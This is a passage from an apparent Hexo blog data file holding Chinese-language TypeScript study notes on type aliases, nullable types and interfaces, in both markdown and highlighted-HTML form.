class=\"keyword\">private</span> value: <span class=\"built_in\">string</span></span>) &#123; &#125;</span><br><span class=\"line\">    getPaddingString() &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getRandomPadder</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">Math</span>.random() &lt; <span class=\"number\">0.5</span> ?</span><br><span class=\"line\">        <span class=\"keyword\">new</span> SpaceRepeatingPadder(<span class=\"number\">4</span>) :</span><br><span class=\"line\">        <span class=\"keyword\">new</span> StringPadder(<span class=\"string\">\"  \"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 类型为SpaceRepeatingPadder | StringPadder</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> padder: Padder = getRandomPadder();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (padder <span class=\"keyword\">instanceof</span> SpaceRepeatingPadder) &#123;</span><br><span class=\"line\">    padder; <span class=\"comment\">// 类型细化为'SpaceRepeatingPadder'</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (padder <span class=\"keyword\">instanceof</span> StringPadder) &#123;</span><br><span class=\"line\">    padder; <span class=\"comment\">// 类型细化为'StringPadder'</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"可以为-null-的类型\"><a href=\"#可以为-null-的类型\" class=\"headerlink\" title=\"可以为 null 的类型\"></a>可以为 null 的类型</h3><p><code>TypeScript</code> 具有两种特殊的类型， <code>null</code> 和 <code>undefined</code>，它们分别具有值<strong>null</strong>和<strong>undefined</strong>。<br>默认情况下，类型检查器认为 <code>null</code> 与 <code>undefined</code> 可以赋值给任何类型。 <code>null</code> 与 <code>undefined</code> 是所有其它类型的一个有效值。 这也意味着，你阻止不了将它们赋值给其它类型，就算是你想要阻止这种情况也不行。</p>\n<h4 id=\"可选参数与可选属性\"><a href=\"#可选参数与可选属性\" class=\"headerlink\" title=\"可选参数与可选属性\"></a>可选参数与可选属性</h4><p>使用了 <code>--strictNullChecks</code>，<code>可选参数</code>会被自动地加上 <code>| undefined</code>。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f</span>(<span class=\"params\">x: <span class=\"built_in\">number</span>, y?: <span class=\"built_in\">number</span></span>) </span>&#123; <span class=\"comment\">// -&gt; (x: number, y?: number | undefined)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> x + (y || <span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">f(<span class=\"number\">1</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\">f(<span class=\"number\">1</span>);</span><br><span class=\"line\">f(<span class=\"number\">1</span>, <span class=\"literal\">undefined</span>); <span class=\"comment\">// 注意，是可选参数，不是参数</span></span><br><span class=\"line\">f(<span class=\"number\">1</span>, <span class=\"literal\">null</span>); <span class=\"comment\">// error, null !== undefined</span></span><br></pre></td></tr></table></figure>\n<p>同理，<code>可选属性</code> 中也是同样的结果：</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> C &#123;</span><br><span class=\"line\">    a: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">    b?: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> c = <span class=\"keyword\">new</span> C();</span><br><span class=\"line\">c.a = <span class=\"number\">12</span>;</span><br><span class=\"line\">c.b = <span class=\"number\">13</span>;</span><br><span class=\"line\">c.b = <span class=\"literal\">undefined</span>; <span class=\"comment\">// ok</span></span><br><span class=\"line\">c.b = <span class=\"literal\">null</span>; <span class=\"comment\">// error, null !== undefined</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"类型保护和类型断言\"><a href=\"#类型保护和类型断言\" class=\"headerlink\" title=\"类型保护和类型断言\"></a>类型保护和类型断言</h4><p>由于可以为null的类型是通过联合类型实现，那么你需要使用类型保护来去除 <code>null</code>。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f</span>(<span class=\"params\">sn: <span class=\"built_in\">string</span> | <span class=\"literal\">null</span></span>): <span class=\"title\">string</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sn || <span class=\"string\">\"default\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>如果编译器不能够去除 <code>null</code> 或 <code>undefined</code>，你可以使用 <code>类型断言</code> 手动去除。 语法是添加 <code>!</code> 后缀:<br>例如：<br><code>identifier!</code> 表示从 <code>identifier</code> 的类型里去除了 <code>null</code> 和 <code>undefined</code>。</p>\n<h3 id=\"类型别名\"><a href=\"#类型别名\" class=\"headerlink\" title=\"类型别名\"></a>类型别名</h3><p>类型别名会给一个类型起个新名字。 类型别名有时和接口很像，但是可以作用于原始值，联合类型，元组以及其它任何你需要手写的类型。<br><strong>起别名不会新建一个类型 - 它创建了一个新名字来引用那个类型</strong>。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> Name = <span class=\"built_in\">string</span>; <span class=\"comment\">// string 重命名为 Name</span></span><br><span class=\"line\"><span class=\"keyword\">type</span> NameResolver = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> <span class=\"built_in\">string</span>; <span class=\"comment\">// 同上..</span></span><br><span class=\"line\"><span class=\"keyword\">type</span> NameOrResolver = Name | NameResolver;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getName</span>(<span class=\"params\">n: NameOrResolver</span>): <span class=\"title\">Name</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> n === <span class=\"string\">'string'</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> n;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> n();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"类型别名-type-vs-接口-interface\"><a href=\"#类型别名-type-vs-接口-interface\" class=\"headerlink\" title=\"类型别名(type) vs 接口(interface)\"></a>类型别名(type) vs 接口(interface)</h4><ol>\n<li>接口创建了一个新的名字，可以在其它任何地方使，类型别名并不创建新名字。</li>\n<li>类型别名不能被 <code>extends</code> 和 <code>implements</code>(自己也不能 <code>extends</code> 和 <code>implements</code> 其它类型)。</li>\n<li>如果你无法通过接口来描述一个类型并且需要使用联合类型或元组类型，这时通常会使用类型别名。</li>\n</ol>"},{"title":"Typescript学习日记(二)","date":"2017-01-18T09:59:42.000Z","_content":"\n本篇介绍 `typescript` 中接口的使用方式。\n<!-- more -->\n\n### 接口(interface)\n\n`TypeScript`的核心原则之一是对值所具有的结构进行类型检查。接口的作用就是为这些类型命名和为你的代码或第三方代码定义契约。\n基础类型是为简单的变量定义类型，**通常的，接口就是为你所定义的对象(参数、函数等)的添加类型的约束。**\n按照 typescript 的默认约定，接口通常是以 `驼峰命名方式，大写字母开头` 的方式定义。\n\n#### 使用方式\n\n```ts\n// 定义一个接口约束\ninterface T {\n    num: number;\n    str: string\n}\n\n// 函数的接受的参数中，num必须为number类型，str必须为string类型\nfunction demo(arg: T) {\n    console.log(typeof arg.num)\n}\n\n// 也可以直接把约束条件写在函数参数中，为了可读性，推荐在外面定义\n// eg:\n// function demo(arg: { num: number; str: string }) {\n//     console.log(typeof arg.num)\n// }\n\nlet obj1 = {num: 100, str: 'typescript'}\ndemo(obj1) // success -> number\n\nlet obj2 = {num: '123', str: 'typescript'}\ndemo(obj2) // error\n\nlet obj3 = {num: 123}\ndemo(obj3) // error 缺少一个 str 参数\n```\n\n**注意：定义接口的时候不需要使用 `=`，`{}` 内部必须使用 `分号(;)` 分隔。**\n\n\n#### 接口的可选属性\n\n接口里的属性不全都是必需的。 有些是只在某些条件下存在，或者根本不存在。\n\n```ts\ninterface T {\n    num: number;\n    str?: string;\n}\n\nfunction demo(arg: T) {\n    console.log(typeof arg.num)\n}\n\nlet obj4 = {num: 100, str: 'typescript'}\ndemo(obj4) // success\n\nlet obj5 = {num: 100}\ndemo(obj5) // success\n\nlet obj6 = {str: 'typescript'}\ndemo(obj6) // error\n\n```\n\n#### 接口的只读属性\n\n这里的 `只读属性` 类似于原生javascript的 `const` 关键字，在赋值之后就不能更改了。\n\n```ts\ninterface Rd {\n    readonly x: number;\n    readonly y: string\n}\n\nlet r: Rd = { x: 100, y: 'str' }\n\nr.x = 123; // -> error\n```\n\n#### 只读的数组\n\nTypeScript具有 `ReadonlyArray<T>` 类型，它与 `Array<T>` 相似，只是把所有可变方法去掉了，因此可以确保数组创建后再也不能被修改。\n\n```ts\nlet arr: ReadonlyArray<number> = [1,2,3,4];\n\narr[0] = 2; // -> error\narr.push(5); // -> error\narr.length = 10; // -> error\n\nlet arr1: Array<number> = arr;\n// error, arr 是ReadonlyArray，不能赋值给别的数组\n```\n\n#### readonly还是const\n\n最简单判断该用readonly还是const的方法是看要把它做为变量使用还是做为一个属性。 \n做为变量使用的话用 const，若做为属性则使用readonly。\n\n#### 额外的属性检查\n\n```ts\n\ninterface Pc {\n    x?: number;\n    y?: string\n}\n\nfunction demo(arg: Pc) {\n    // ..\n}\n\ndemo({x: 100, z: 110})\n// error，因为 z 并没有在接口 Pc 中定义\n\n// 使用类型断言改写\ndemo({x: 100, z: 110} as Pc)\n\n// 告诉 ts 入参 '{x: 100, z: 110}' 都是来自于 Pc 接口的，你别 tmd 再帮我检查了\n// ts： 好吧，既然你这么确定，我就听你的。\n\n```\n\n然后上面的这种做法并不是最佳的做法，最佳的做法是添加一个 `占位用的签名`。\n\n```ts\n\n// 我不知道我后面还会传什么属性进来，所以我先用个 propsName 占个位置\ninterface Pc {\n    x?: number;\n    y?: string;\n    [propName: string]: any;\n}\n\n\ndemo({x: 100, z: 110})\n// success\n```\n\n#### 函数类型\n\n为了使用接口表示函数类型，我们需要给接口定义一个调用签名。 它就像是一个 `只有参数列表和返回值类型` 的函数定义。\n**参数列表里的每个参数都需要名字和类型。**\n\n```ts\n\ninterface Fn {\n    (a: number, b: string): boolean\n}\n\n// 定义一个 Fn 函数接口，该函数接受 a: number，b: string 作为参数，返回一个 boolean 值\n```\n\n#### 可索引的类型\n\n可索引类型具有一个 `索引签名`，它描述了对象 `索引的类型`，还有相应的索引 `返回值类型`。\n共有两种索引签名：字符串和数字。可以同时使用两种类型的索引，但是数字索引的返回值必须是字符串索引返回值类型的子类型。\n\n```ts\n// 1. 指定 索引类型 为 number\ninterface IndexNum {\n    [index: number]: string;\n}\n\nlet arr: IndexNum = ['hello', 'world'];\nconsole.log(arr[0])\n\n// 2. 指定 索引类型 为 string\ninterface IndexStr {\n    [index: string]: string;\n}\n\nlet obj: IndexStr = {'x': 'hello', 'y': 'world'}\nconsole.log(obj['x'])\n\n// 3. 同时指定 索引类型 为 number 和 string\n\ninterface TotalIndex {\n    [index: number]: number;\n    at: number; // success\n    where: string; // error 使用 where 获取值时返回的是 string 类型\n}\n\n// 4. 只读的索引类型\n\ninterface RdIndex {\n    readonly [index: number]: string;\n}\n\nlet arr: RdIndex = ['a','b']\n\narr[1] = 'c'; // error, arr 为只读的索引类型\n\n```\n\n#### '类'类型\n\n和其它的类型约束相似，类类型使用 `implements` 实现接口。\n\n```ts\n// 定义方式完全一致\ninterface C {\n    date: Date;\n    setTime(d: Date);\n}\n\n// \nclass Clock implements C {\n     // 声明一个 date 属性，且约束该属性类型为 Date\n     // 这种写法相当于 var date: Date\n     // 只是声明并约束值类型，但并不赋值\n    date: Date;\n    setTime(d: Date) {\n        this.date = d;\n    }\n    constructor(h: number, m: number) {\n        // ..\n    }\n}\n```\n关于更多的 `implements` 的用法我目前也不是特别的清楚，所以下面就不再详细叙述了。\n等我了解清楚之后再补上这一部分内容，你也可以通过查看[官方文档](https://www.tslang.cn/docs/handbook/interfaces.html)了解。\n\n#### 继承接口\n\n和 `es2015` 中的 `extends` 一样，接口也是可以像类一样用来继承的。\n\n```ts\ninterface A {\n    a: number;\n}\n\ninterface C {\n    c: number;\n}\n\ninterface B extends A, C {\n    b: string;\n}\n\nlet obj = <B>{};\nobj.a = 10;\nobj.b = '10';\nobj.c = 10;\n\n```\n\n#### 混合类型\n\n`interface` 还可以在一个接口中约束 `javascript` 中多个类型；\n\n```ts\ninterface Counter {\n    a: number; // 约束 a 为 number 类型\n    getStr(): void;// 约束 getStr 无返回值；\n    (n: number): string;// 约束匿名函数接受一个参数 n 为 number 类型，返回值 string 类型\n}\n\n// 函数 getCounter 返回值被 Counter 约束\nfunction getCounter(): Counter {\n    let counter = <Counter>function (start: number) { }; // 类型断言\n    counter.interval = 123;\n    counter.reset = function () { };\n    return counter;\n}\n\nlet c = getCounter();\nc(10);\nc.reset();\nc.interval = 5.0;\n\n//\n// 这个模版有问题，写 ts 的代码就会出问题\n// 只能这样了\n//\n//\n//\n```\n\n#### 接口继承类\n\n接口继承类时会继承父类所有的属性和方法，包括 `private` 和 `protected` 成员。\n这意味着当你创建了一个接口继承了一个拥有 `私有或受保护的成员` 的类时，这个接口类型只能被 `这个类或其子类` 所实现（implement）。\n\n```ts\nclass Control {\n    private state: any;\n}\n\n// SelectableControl 含有 Control 所有的属性方法\ninterface SelectableControl extends Control {\n    select(): void;\n}\n\n// Button 继承自 Control 含有 Control 所有的属性方法\nclass Button extends Control implements SelectableControl {\n    select() { }\n}\n\n// TextBox 继承自 Control 含有 Control 所有的属性方法\nclass TextBox extends Control {\n\n}\n\n// Image 没有继承自 Control，没有 state 属性，无法实现 SelectableControl 接口\n// 错误：“Image”类型缺少“state”属性。\nclass Image implements SelectableControl {\n    select() { }\n}\n```","source":"_posts/Typescript学习日记（二）.md","raw":"---\ntitle: Typescript学习日记(二)\ndate: 2017-01-18 17:59:42\ntags:\n---\n\n本篇介绍 `typescript` 中接口的使用方式。\n<!-- more -->\n\n### 接口(interface)\n\n`TypeScript`的核心原则之一是对值所具有的结构进行类型检查。接口的作用就是为这些类型命名和为你的代码或第三方代码定义契约。\n基础类型是为简单的变量定义类型，**通常的，接口就是为你所定义的对象(参数、函数等)的添加类型的约束。**\n按照 typescript 的默认约定，接口通常是以 `驼峰命名方式，大写字母开头` 的方式定义。\n\n#### 使用方式\n\n```ts\n// 定义一个接口约束\ninterface T {\n    num: number;\n    str: string\n}\n\n// 函数的接受的参数中，num必须为number类型，str必须为string类型\nfunction demo(arg: T) {\n    console.log(typeof arg.num)\n}\n\n// 也可以直接把约束条件写在函数参数中，为了可读性，推荐在外面定义\n// eg:\n// function demo(arg: { num: number; str: string }) {\n//     console.log(typeof arg.num)\n// }\n\nlet obj1 = {num: 100, str: 'typescript'}\ndemo(obj1) // success -> number\n\nlet obj2 = {num: '123', str: 'typescript'}\ndemo(obj2) // error\n\nlet obj3 = {num: 123}\ndemo(obj3) // error 缺少一个 str 参数\n```\n\n**注意：定义接口的时候不需要使用 `=`，`{}` 内部必须使用 `分号(;)` 分隔。**\n\n\n#### 接口的可选属性\n\n接口里的属性不全都是必需的。 有些是只在某些条件下存在，或者根本不存在。\n\n```ts\ninterface T {\n    num: number;\n    str?: string;\n}\n\nfunction demo(arg: T) {\n    console.log(typeof arg.num)\n}\n\nlet obj4 = {num: 100, str: 'typescript'}\ndemo(obj4) // success\n\nlet obj5 = {num: 100}\ndemo(obj5) // success\n\nlet obj6 = {str: 'typescript'}\ndemo(obj6) // error\n\n```\n\n#### 接口的只读属性\n\n这里的 `只读属性` 类似于原生javascript的 `const` 关键字，在赋值之后就不能更改了。\n\n```ts\ninterface Rd {\n    readonly x: number;\n    readonly y: string\n}\n\nlet r: Rd = { x: 100, y: 'str' }\n\nr.x = 123; // -> error\n```\n\n#### 只读的数组\n\nTypeScript具有 `ReadonlyArray<T>` 类型，它与 `Array<T>` 相似，只是把所有可变方法去掉了，因此可以确保数组创建后再也不能被修改。\n\n```ts\nlet arr: ReadonlyArray<number> = [1,2,3,4];\n\narr[0] = 2; // -> error\narr.push(5); // -> error\narr.length = 10; // -> error\n\nlet arr1: Array<number> = arr;\n// error, arr 是ReadonlyArray，不能赋值给别的数组\n```\n\n#### readonly还是const\n\n最简单判断该用readonly还是const的方法是看要把它做为变量使用还是做为一个属性。 \n做为变量使用的话用 const，若做为属性则使用readonly。\n\n#### 额外的属性检查\n\n```ts\n\ninterface Pc {\n    x?: number;\n    y?: string\n}\n\nfunction demo(arg: Pc) {\n    // ..\n}\n\ndemo({x: 100, z: 110})\n// error，因为 z 并没有在接口 Pc 中定义\n\n// 使用类型断言改写\ndemo({x: 100, z: 110} as Pc)\n\n// 告诉 ts 入参 '{x: 100, z: 110}' 都是来自于 Pc 接口的，你别 tmd 再帮我检查了\n// ts： 好吧，既然你这么确定，我就听你的。\n\n```\n\n然后上面的这种做法并不是最佳的做法，最佳的做法是添加一个 `占位用的签名`。\n\n```ts\n\n// 我不知道我后面还会传什么属性进来，所以我先用个 propsName 占个位置\ninterface Pc {\n    x?: number;\n    y?: string;\n    [propName: string]: any;\n}\n\n\ndemo({x: 100, z: 110})\n// success\n```\n\n#### 函数类型\n\n为了使用接口表示函数类型，我们需要给接口定义一个调用签名。 它就像是一个 `只有参数列表和返回值类型` 的函数定义。\n**参数列表里的每个参数都需要名字和类型。**\n\n```ts\n\ninterface Fn {\n    (a: number, b: string): boolean\n}\n\n// 定义一个 Fn 函数接口，该函数接受 a: number，b: string 作为参数，返回一个 boolean 值\n```\n\n#### 可索引的类型\n\n可索引类型具有一个 `索引签名`，它描述了对象 `索引的类型`，还有相应的索引 `返回值类型`。\n共有两种索引签名：字符串和数字。可以同时使用两种类型的索引，但是数字索引的返回值必须是字符串索引返回值类型的子类型。\n\n```ts\n// 1. 指定 索引类型 为 number\ninterface IndexNum {\n    [index: number]: string;\n}\n\nlet arr: IndexNum = ['hello', 'world'];\nconsole.log(arr[0])\n\n// 2. 指定 索引类型 为 string\ninterface IndexStr {\n    [index: string]: string;\n}\n\nlet obj: IndexStr = {'x': 'hello', 'y': 'world'}\nconsole.log(obj['x'])\n\n// 3. 同时指定 索引类型 为 number 和 string\n\ninterface TotalIndex {\n    [index: number]: number;\n    at: number; // success\n    where: string; // error 使用 where 获取值时返回的是 string 类型\n}\n\n// 4. 只读的索引类型\n\ninterface RdIndex {\n    readonly [index: number]: string;\n}\n\nlet arr: RdIndex = ['a','b']\n\narr[1] = 'c'; // error, arr 为只读的索引类型\n\n```\n\n#### '类'类型\n\n和其它的类型约束相似，类类型使用 `implements` 实现接口。\n\n```ts\n// 定义方式完全一致\ninterface C {\n    date: Date;\n    setTime(d: Date);\n}\n\n// \nclass Clock implements C {\n     // 声明一个 date 属性，且约束该属性类型为 Date\n     // 这种写法相当于 var date: Date\n     // 只是声明并约束值类型，但并不赋值\n    date: Date;\n    setTime(d: Date) {\n        this.date = d;\n    }\n    constructor(h: number, m: number) {\n        // ..\n    }\n}\n```\n关于更多的 `implements` 的用法我目前也不是特别的清楚，所以下面就不再详细叙述了。\n等我了解清楚之后再补上这一部分内容，你也可以通过查看[官方文档](https://www.tslang.cn/docs/handbook/interfaces.html)了解。\n\n#### 继承接口\n\n和 `es2015` 中的 `extends` 一样，接口也是可以像类一样用来继承的。\n\n```ts\ninterface A {\n    a: number;\n}\n\ninterface C {\n    c: number;\n}\n\ninterface B extends A, C {\n    b: string;\n}\n\nlet obj = <B>{};\nobj.a = 10;\nobj.b = '10';\nobj.c = 10;\n\n```\n\n#### 混合类型\n\n`interface` 还可以在一个接口中约束 `javascript` 中多个类型；\n\n```ts\ninterface Counter {\n    a: number; // 约束 a 为 number 类型\n    getStr(): void;// 约束 getStr 无返回值；\n    (n: number): string;// 约束匿名函数接受一个参数 n 为 number 类型，返回值 string 类型\n}\n\n// 函数 getCounter 返回值被 Counter 约束\nfunction getCounter(): Counter {\n    let counter = <Counter>function (start: number) { }; // 类型断言\n    counter.interval = 123;\n    counter.reset = function () { };\n    return counter;\n}\n\nlet c = getCounter();\nc(10);\nc.reset();\nc.interval = 5.0;\n\n//\n// 这个模版有问题，写 ts 的代码就会出问题\n// 只能这样了\n//\n//\n//\n```\n\n#### 接口继承类\n\n接口继承类时会继承父类所有的属性和方法，包括 `private` 和 `protected` 成员。\n这意味着当你创建了一个接口继承了一个拥有 `私有或受保护的成员` 的类时，这个接口类型只能被 `这个类或其子类` 所实现（implement）。\n\n```ts\nclass Control {\n    private state: any;\n}\n\n// SelectableControl 含有 Control 所有的属性方法\ninterface SelectableControl extends Control {\n    select(): void;\n}\n\n// Button 继承自 Control 含有 Control 所有的属性方法\nclass Button extends Control implements SelectableControl {\n    select() { }\n}\n\n// TextBox 继承自 Control 含有 Control 所有的属性方法\nclass TextBox extends Control {\n\n}\n\n// Image 没有继承自 Control，没有 state 属性，无法实现 SelectableControl 接口\n// 错误：“Image”类型缺少“state”属性。\nclass Image implements SelectableControl {\n    select() { }\n}\n```","slug":"Typescript学习日记（二）","published":1,"updated":"2018-10-25T06:05:58.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjno6s7qm000a02vsae15y2cm","content":"<p>本篇介绍 <code>typescript</code> 中接口的使用方式。<br><a id=\"more\"></a></p>\n<h3 id=\"接口-interface\"><a href=\"#接口-interface\" class=\"headerlink\" title=\"接口(interface)\"></a>接口(interface)</h3><p><code>TypeScript</code>的核心原则之一是对值所具有的结构进行类型检查。接口的作用就是为这些类型命名和为你的代码或第三方代码定义契约。<br>基础类型是为简单的变量定义类型，<strong>通常的，接口就是为你所定义的对象(参数、函数等)的添加类型的约束。</strong><br>按照 typescript 的默认约定，接口通常是以 <code>驼峰命名方式，大写字母开头</code> 的方式定义。</p>\n<h4 id=\"使用方式\"><a href=\"#使用方式\" class=\"headerlink\" title=\"使用方式\"></a>使用方式</h4><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 定义一个接口约束</span></span><br><span class=\"line\"><span class=\"keyword\">interface</span> T &#123;</span><br><span class=\"line\">    num: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">    str: <span class=\"built_in\">string</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 函数的接受的参数中，num必须为number类型，str必须为string类型</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">demo</span>(<span class=\"params\">arg: T</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">typeof</span> arg.num)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 也可以直接把约束条件写在函数参数中，为了可读性，推荐在外面定义</span></span><br><span class=\"line\"><span class=\"comment\">// eg:</span></span><br><span class=\"line\"><span class=\"comment\">// function demo(arg: &#123; num: number; str: string &#125;) &#123;</span></span><br><span class=\"line\"><span class=\"comment\">//     console.log(typeof arg.num)</span></span><br><span class=\"line\"><span class=\"comment\">// &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> obj1 = &#123;num: <span class=\"number\">100</span>, str: <span class=\"string\">'typescript'</span>&#125;</span><br><span class=\"line\">demo(obj1) <span class=\"comment\">// success -&gt; number</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> obj2 = &#123;num: <span class=\"string\">'123'</span>, str: <span class=\"string\">'typescript'</span>&#125;</span><br><span class=\"line\">demo(obj2) <span class=\"comment\">// error</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> obj3 = &#123;num: <span class=\"number\">123</span>&#125;</span><br><span class=\"line\">demo(obj3) <span class=\"comment\">// error 缺少一个 str 参数</span></span><br></pre></td></tr></table></figure>\n<p><strong>注意：定义接口的时候不需要使用 <code>=</code>，<code>{}</code> 内部必须使用 <code>分号(;)</code> 分隔。</strong></p>\n<h4 id=\"接口的可选属性\"><a href=\"#接口的可选属性\" class=\"headerlink\" title=\"接口的可选属性\"></a>接口的可选属性</h4><p>接口里的属性不全都是必需的。 有些是只在某些条件下存在，或者根本不存在。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> T &#123;</span><br><span class=\"line\">    num: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">    str?: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">demo</span>(<span class=\"params\">arg: T</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">typeof</span> arg.num)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> obj4 = &#123;num: <span class=\"number\">100</span>, str: <span class=\"string\">'typescript'</span>&#125;</span><br><span class=\"line\">demo(obj4) <span class=\"comment\">// success</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> obj5 = &#123;num: <span class=\"number\">100</span>&#125;</span><br><span class=\"line\">demo(obj5) <span class=\"comment\">// success</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> obj6 = &#123;str: <span class=\"string\">'typescript'</span>&#125;</span><br><span class=\"line\">demo(obj6) <span class=\"comment\">// error</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"接口的只读属性\"><a href=\"#接口的只读属性\" class=\"headerlink\" title=\"接口的只读属性\"></a>接口的只读属性</h4><p>这里的 <code>只读属性</code> 类似于原生javascript的 <code>const</code> 关键字，在赋值之后就不能更改了。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> Rd &#123;</span><br><span class=\"line\">    readonly x: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">    readonly y: <span class=\"built_in\">string</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> r: Rd = &#123; x: <span class=\"number\">100</span>, y: <span class=\"string\">'str'</span> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">r.x = <span class=\"number\">123</span>; <span class=\"comment\">// -&gt; error</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"只读的数组\"><a href=\"#只读的数组\" class=\"headerlink\" title=\"只读的数组\"></a>只读的数组</h4><p>TypeScript具有 <code>ReadonlyArray&lt;T&gt;</code> 类型，它与 <code>Array&lt;T&gt;</code> 